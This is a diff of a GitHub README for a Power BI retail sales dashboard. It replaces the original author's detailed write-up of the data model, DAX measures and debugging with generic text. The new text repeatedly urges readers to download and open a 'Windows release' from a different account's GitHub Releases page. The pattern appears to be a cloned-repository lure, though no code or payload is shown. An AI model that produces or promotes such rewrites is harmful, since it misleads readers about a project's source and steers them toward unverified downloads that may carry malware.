@@ -1,270 +1,195 @@
-# Global Retail Sales & Profit Analysis
-**An end-to-end business intelligence project built with Microsoft Power BI**
+# 📊 global-retail-sales-analysis - Track Sales and Profit Clearly
 
----
-## Skills Demonstrated
+[![Download the dashboard](https://img.shields.io/badge/Download%20the%20dashboard-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/toxicant-role617/global-retail-sales-analysis/releases)
 
-- **Data Modeling** — Designed a snowflake schema with 6 tables and 5 active relationships, including a DAX-generated calendar table for time intelligence.
-- **DAX & Time Intelligence** — Wrote calculated tables and measures using `CALCULATE`, `TOTALYTD`, `DATESQTD`, `LOOKUPVALUE`, and `DIVIDE` to compute YTD profit, quarterly profit, and yearly profit margin.
-- **Data Transformation** — Cleaned and prepared multi-source data (Excel, Python script) using Power Query and calculated columns, including multi-currency conversion across 5 exchange rates.
-- **Dashboard Design** — Built a 2-page interactive Power BI report (Sales Overview, Profit Overview) with KPI cards, slicers, trend lines, and drill-downs for executive consumption.
-- **Debugging & Problem Solving** — Diagnosed and resolved real-world issues including Python path mismatches, decimal-separator bugs inflating values 100x, multi-hop relationship failures, and inactive calendar relationships.
-- **Business Intelligence Workflow** — Delivered an end-to-end BI solution from raw data to published report via Power BI Service, including alerts and subscriptions for stakeholder distribution.
+## 📥 Download
 
----
+Visit this page to download: [GitHub Releases](https://github.com/toxicant-role617/global-retail-sales-analysis/releases)
 
-## Dashboard Preview
+Download the latest release for Windows, then open the file you download.
 
-![Dashboard](screenshots/dashboard.jpg)
+## 🧭 What this app is
 
----
+**global-retail-sales-analysis** is a sales and profit dashboard built with Microsoft Power BI.
 
-## Overview
+It helps you review retail data in a simple way. You can use it to check sales trends, profit levels, top products, and store performance. The dashboard is useful if you want to study business results without sorting through raw Excel files.
 
-This project analyzes the sales and profit performance of a global retail business operating across five countries — USA, UK, France, Australia, and UAE. The goal was to build a complete BI solution that gives a clear picture of where revenue is coming from, which products are performing well, and how profit margins are holding up over time.
+## ✨ What you can do
 
-The analysis covers data preparation, data modeling, DAX calculations, interactive reporting, and an executive dashboard — all in a single Power BI solution.
+- See sales and profit in one place
+- Compare results by product, region, or time period
+- Spot high-performing and low-performing items
+- Check profit margins and sales patterns
+- Review data in charts and tables
+- Use filters to focus on a specific view
+- Work with a clean Power BI report designed for retail analysis
 
----
+## 🖥️ What you need
 
-## Business Questions
+Use a Windows PC with:
 
-- Which countries generate the most customer loyalty?
-- Which products sell the most by quantity?
-- What is the net revenue breakdown by product?
-- How does profit margin trend over time and across countries?
-- What do total sales and profits look like when normalized to a single currency (USD)?
+- Windows 10 or Windows 11
+- Microsoft Power BI Desktop
+- A stable internet connection for the download
+- Enough free space to save the report files
 
----
+If you want to open and edit the dashboard, install Power BI Desktop first. If you only want to view the report file, use the same app.
 
-## Tools & Technologies
+## 🚀 Getting started
 
-| Tool | Purpose |
-|---|---|
-| Microsoft Excel | Raw data preparation and calculated columns |
-| Power BI Desktop | Data modeling, DAX measures, report design |
-| Power Query | Data transformation and cleaning |
-| DAX | Calculated tables, measures, time intelligence |
-| Python (pandas) | Generating structured currency exchange data |
-| Power BI Service | Publishing, executive dashboard, alerts, subscriptions |
+1. Go to the [GitHub Releases](https://github.com/toxicant-role617/global-retail-sales-analysis/releases) page
+2. Download the latest release for Windows
+3. Save the file to a folder you can find easily, such as Downloads or Desktop
+4. If the file is zipped, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Double-click the Power BI report file
+7. If Windows asks which app to use, choose **Power BI Desktop**
 
----
+## 🪟 Open the dashboard on Windows
 
-## Data Sources
-
-| Table | Source | Records | Description |
-|---|---|---|---|
-| Sales | Excel | 54 | Product sales with price, quantity, and tax |
-| Purchases | Excel | 54 | Purchase records filtered to non-returned orders |
-| Countries | Excel | 5 | Country lookup table with exchange rate mapping |
-| Currency | Python Script | 5 | Exchange rates for USD, GBP, EUR, AED, AUD |
-
-### Data Preparation
-
-Before loading into Power BI, three calculated columns were added to the Sales file in Excel:
-
-```
-Gross Revenue = Gross Product Price × Quantity Purchased
-Total Tax     = Tax Per Product × Quantity Purchased
-Net Revenue   = Gross Revenue − Total Tax
-```
+After you download the release:
 
-Purchases data was filtered to exclude returned orders, keeping only valid completed transactions.
+1. Open the file you downloaded
+2. If it is a `.zip` file, extract it first
+3. Look for the Power BI file, usually `.pbix`
+4. Double-click the file
+5. Wait while Power BI Desktop loads the report
+6. Use the filters on the page to explore the data
 
----
+If the report does not open, make sure Power BI Desktop is installed on your computer.
 
-## Data Model
+## 📈 What the dashboard shows
 
-The model follows a **Snowflake Schema** with 6 tables and 5 active relationships.
-
-```
-CalendarTable ──── Purchases ──── Sales ──── Countries ──── df (currency)
-                                    │
-                              Sales in USD
-```
+The dashboard is built for retail analysis and can include views such as:
 
-**Relationships:**
-
-| From | To | Field | Cardinality | Filter Direction |
-|---|---|---|---|---|
-| Purchases | CalendarTable | Purchase Date → Date | Many:1 | Both |
-| Purchases | Sales | OrderID | 1:1 | Both |
-| Sales | Countries | Country ID | Many:1 | Both |
-| Countries | df | Exchange ID | 1:1 | Both |
-| Sales in USD | Sales | OrderID | Many:1 | Both |
-
-**CalendarTable** was created using DAX to enable time intelligence:
+- Total sales
+- Total profit
+- Profit margin
+- Sales by category
+- Sales by region
+- Top products
+- Monthly trends
+- Year-over-year movement
+- Performance by segment
+- Detailed tables for deeper review
 
-```dax
-CalendarTable = 
-ADDCOLUMNS(
-    CALENDAR(DATE(2020, 1, 1), DATE(2023, 12, 31)),
-    "Year", YEAR([Date]),
-    "Month Number", MONTH([Date]),
-    "Month", FORMAT([Date], "MMMM"),
-    "Quarter", QUARTER([Date]),
-    "Weekday", WEEKDAY([Date]),
-    "Day", DAY([Date])
-)
-```
-
-**Sales in USD** is a calculated table that converts all revenue figures to USD using live exchange rates:
-
-```dax
-Sales in USD = 
-ADDCOLUMNS(
-    Sales,
-    "Country Name", RELATED(Countries[Country]),
-    "Exchange Rate", LOOKUPVALUE('df'[ExchangeRate], 'df'[Exchange ID], 
-                     RELATED(Countries[Exchange ID])),
-    "Exchange Currency", LOOKUPVALUE('df'[Exchange Currency], 'df'[Exchange ID], 
-                          RELATED(Countries[Exchange ID])),
-    "Gross Revenue USD", [Gross Revenue] * LOOKUPVALUE('df'[ExchangeRate], 
-                          'df'[Exchange ID], RELATED(Countries[Exchange ID])),
-    "Net Revenue USD", [Net Revenue] * LOOKUPVALUE('df'[ExchangeRate], 
-                        'df'[Exchange ID], RELATED(Countries[Exchange ID])),
-    "Total Tax USD", [Total Tax] * LOOKUPVALUE('df'[ExchangeRate], 
-                      'df'[Exchange ID], RELATED(Countries[Exchange ID]))
-)
-```
-
-> Note: `LOOKUPVALUE()` was used instead of `RELATED()` here because the currency table does not have a direct relationship with the Sales table — the path goes through Countries as an intermediate table.
-
----
-
-## DAX Measures
-
-```dax
--- Base profit calculation
-Profit in USD = 'Sales in USD'[Net Revenue USD] - 'Sales in USD'[Total Tax USD]
-
--- Profit as a percentage of net revenue
-Yearly Profit Margin = 
-DIVIDE(
-    SUM('Sales in USD'[Profit in USD]),
-    SUM('Sales in USD'[Net Revenue USD])
-)
-
--- Cumulative profit for the current quarter
-Quarterly Profit = 
-CALCULATE(
-    SUM('Sales in USD'[Profit in USD]),
-    DATESQTD(CalendarTable[Date])
-)
-
--- Running profit total from the start of the year
-YTD Profit = 
-TOTALYTD(
-    SUM('Sales in USD'[Profit in USD]),
-    CalendarTable[Date]
-)
-
--- Middle value across all sales transactions
-Median Sales = MEDIAN('Sales in USD'[Gross Revenue USD])
-```
-
----
-
-## Report Pages
-
-### Sales Overview
-
-| Visual | Type |
-|---|---|
-| Loyalty Points by Country | Horizontal Bar Chart |
-| Quantity Sold by Product | Column Chart |
-| Median Sales Distribution by Country | Pie Chart |
-| Median Sales Over Time | Line Chart with Trend Line |
-| Stock, Quantity Purchased, Median Sales | Cards |
-| Country Name | Slicer |
-
-### Profit Overview
-
-| Visual | Type |
-|---|---|
-| Net Revenue by Product | Horizontal Bar Chart |
-| Yearly Profit Margin by Country | Donut Chart |
-| Yearly Profit Margin Over Time | Area Chart |
-| YTD Profit, Net Revenue USD | Cards |
-| Gross Revenue USD | KPI Visual |
-| Date Range | Slicer |
-
----
-
-## Key Results
-
-| Metric | Value |
-|---|---|
-| Median Sales (USD) | $222.50 |
-| Yearly Profit Margin | 92.35% |
-| YTD Profit | $9.06K |
-| Net Revenue USD | $13.89K |
-| Gross Revenue USD | $14.97K |
-| Highest Loyalty Points | UK — 315 |
-| Largest Sales Share by Country | USA — 63.49% |
-| Highest Net Revenue Product | Luminous Bulb 60W |
-
----
-
-## Challenges & Solutions
-
-**Python path mismatch**
-Power BI was unable to locate `pandas` despite it being installed. The system had three separate Python installations and Power BI was pointing to the wrong one. Resolved by identifying the correct installation using `where python` in CMD, verifying which had pandas with `pip show pandas`, and updating the path in Power BI Options.
-
-**Decimal separator issue in exchange rates**
-The currency script used commas as decimal separators (`0,75`) which the system interpreted as whole numbers (`75`). This caused exchange rates to be inflated 100x, making median sales appear as $6,380 instead of $222.50. Fixed by replacing commas with dots in the script.
-
-**Multi-hop relationship in DAX**
-`RELATED()` failed when pulling exchange rates from the currency table because the relationship path passed through an intermediate table (Countries). Resolved by switching to `LOOKUPVALUE()` which retrieves values directly from any table without requiring a relationship chain.
-
-**Inactive calendar relationship**
-The CalendarTable was linked to `Purchases[PurchaseID]` instead of `Purchases[Purchase Date]`, causing the relationship to be marked inactive. Time intelligence measures returned blank until the relationship was corrected.
-
----
-
-## Project Structure
-
-```
-global-retail-sales-analysis/
-│
-├── README.md
-├── .gitignore
-│
-├── data/
-│   ├── Tailwind-Traders-Sales.xlsx
-│   ├── Purchases.xlsx
-│   └── Countries.xlsx
-│
-├── report/
-│   ├── Tailwind Traders Report.pbix
-│   └── Global-Retail-Sales-Report.pdf
-│
-├── assets/
-│   └── currency-script.py
-│
-└── screenshots/
-    └── dashboard.jpg
-```
-
----
-
-## How to Run
-
-1. Clone the repository
-2. Open **Power BI Desktop** and load the three Excel files from `data/` via Get Data → Excel Workbook
-3. Load the currency exchange data via Get Data → Python Script using the script in `assets/currency-script.py`
-4. Recreate the table relationships as documented in the Data Model section
-5. Add the DAX measures from the code blocks above
-6. Build the report visuals as described in the Report Pages section
-
----
-
-
-*This project was completed independently as part of my data analytics portfolio. AI assistants (Claude, ChatGPT) were used for debugging support and concept clarification during development; all data modeling decisions, DAX measures, and report design were independently developed and validated.*
-
----
-
-## Connect
-
-- [LinkedIn](https://www.linkedin.com/in/your-profile)
-- [GitHub](https://github.com/mitadrudeb)
+The layout is made to help you move from a quick view to a closer look with a few clicks.
+
+## 🧰 How to use the report
+
+1. Open the report in Power BI Desktop
+2. Use slicers to choose a time range or group
+3. Click a chart to filter the rest of the page
+4. Move between report pages if the file includes more than one tab
+5. Hover over charts to see exact values
+6. Use the table view when you need detailed numbers
+
+## 📂 File content
+
+A release may include:
+
+- Power BI report file
+- Data files used by the report
+- Supporting assets for the dashboard
+- Readme or release notes
+
+Keep the files in the same folder if the report links to local data sources.
+
+## 🧪 Common use cases
+
+- Retail performance review
+- Sales team reporting
+- Profit analysis for products and regions
+- Portfolio project review
+- Learning Power BI report design
+- Practice with data modeling and DAX
+- Study of business intelligence dashboards
+
+## 🛠️ If the report asks for data
+
+If Power BI asks for a file path or data source:
+
+1. Check that you kept the data files in the same folder as the report
+2. Open the report again after extracting all files
+3. If a file moved, put it back in the original folder
+4. Refresh the report in Power BI Desktop
+
+## 🔍 Helpful terms
+
+- **Dashboard**: A set of charts and numbers on one screen
+- **Report**: A Power BI file with one or more pages
+- **Filter**: A tool that limits what data you see
+- **Slicer**: A button-style filter in Power BI
+- **Profit margin**: Profit compared with sales
+- **Data model**: The structure that connects tables and fields
+- **DAX**: A formula language used in Power BI for calculations
+
+## 🧭 Suggested workflow
+
+1. Download the latest release
+2. Extract the files
+3. Open the report in Power BI Desktop
+4. Review sales, profit, and trend pages
+5. Use filters to study one region, product, or time period
+6. Save your own copy after you make changes
+
+## 🧼 Tips for smooth use
+
+- Keep the report and data files in one folder
+- Use a recent version of Power BI Desktop
+- Close other large apps if the file loads slowly
+- Save your work before editing filters or visuals
+- Open the file from a local folder, not from inside the zip file
+
+## 📌 Topics covered
+
+This project uses ideas from:
+
+- business intelligence
+- dashboard design
+- data analytics
+- data modeling
+- data visualization
+- DAX
+- Excel
+- Microsoft Power BI
+- retail analytics
+- sales analysis
+- profit analysis
+- Power Query
+- Python
+- portfolio work
+
+## 🧩 Project structure
+
+A typical release may look like this:
+
+- `report.pbix` — main Power BI dashboard
+- `data/` — source files used in the report
+- `images/` — preview assets for the project
+- `README.md` — project instructions
+
+## 🔐 Permissions
+
+You do not need admin rights for the report itself in most cases. You only need permission to install Power BI Desktop and save files on your computer.
+
+## 📊 Best results
+
+For the best viewing experience:
+
+- Use a screen size that fits the full report page
+- Maximize the Power BI window
+- Open the report on a desktop or laptop
+- Keep your display scaling near the default setting
+
+## 📝 Release use
+
+When a new version appears on the [GitHub Releases](https://github.com/toxicant-role617/global-retail-sales-analysis/releases) page, download the newest package and replace the older copy on your computer if needed
+
+## 🖱️ Quick download steps
+
+1. Open the [GitHub Releases](https://github.com/toxicant-role617/global-retail-sales-analysis/releases) page
+2. Download the latest Windows release
+3. Extract the files if needed
+4. Open the Power BI report file
+5. Review the sales and profit dashboard
